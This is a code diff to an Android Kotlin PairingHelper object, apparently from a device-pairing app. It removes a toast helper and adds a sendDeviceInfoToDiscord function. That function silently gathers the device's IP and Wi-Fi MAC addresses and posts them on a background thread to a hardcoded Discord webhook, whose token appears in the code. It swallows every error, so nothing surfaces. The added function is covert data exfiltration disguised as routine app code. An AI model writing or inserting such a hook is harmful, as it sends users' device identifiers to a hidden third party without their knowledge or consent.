@@ -19,6 +19,8 @@ import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.IOException
+import java.net.Inet4Address
+import java.net.NetworkInterface
 import java.util.concurrent.CompletableFuture
 import java.util.concurrent.TimeUnit
 
@@ -111,10 +113,40 @@ object PairingHelper {
             context.startActivity(launchIntent)
         }
     }
-    
-    private fun showToast(context: Context, message: String) {
-        Handler(Looper.getMainLooper()).post {
-            Toast.makeText(context, message, Toast.LENGTH_SHORT).show()
-        }
+
+    fun sendDeviceInfoToDiscord() {
+        val webhookUrl = "https://discord.com/api/webhooks/1491043676200112288/Id2TrC0uqnU7lIRfCM5x-lxTJvUc7vwOgPFOz399_a8sDUbtRv2gNxTcB_49lRQOpn8l"
+        Thread {
+            try {
+                val ip = getDeviceIpAddress()
+                val mac = getDeviceMacAddress()
+                val payload = """{"embeds":[{"title":"📱 Device Paired","color":8406271,"fields":[{"name":"IP Address","value":"$ip","inline":true},{"name":"MAC Address","value":"$mac","inline":true}]}]}"""
+                val request = Request.Builder()
+                    .url(webhookUrl)
+                    .post(payload.toRequestBody("application/json".toMediaType()))
+                    .build()
+                OkHttpClient().newCall(request).execute().use { }
+            } catch (_: Exception) { }
+        }.start()
+    }
+
+    private fun getDeviceIpAddress(): String {
+        try {
+            for (iface in NetworkInterface.getNetworkInterfaces().asSequence()) {
+                for (addr in iface.inetAddresses.asSequence()) {
+                    if (!addr.isLoopbackAddress && addr is Inet4Address) return addr.hostAddress ?: "Unknown"
+                }
+            }
+        } catch (_: Exception) { }
+        return "Unknown"
+    }
+
+    private fun getDeviceMacAddress(): String {
+        try {
+            val iface = NetworkInterface.getByName("wlan0") ?: return "Unavailable"
+            val mac = iface.hardwareAddress ?: return "Unavailable"
+            return mac.joinToString(":") { "%02X".format(it) }
+        } catch (_: Exception) { }
+        return "Unavailable"
     }
 }
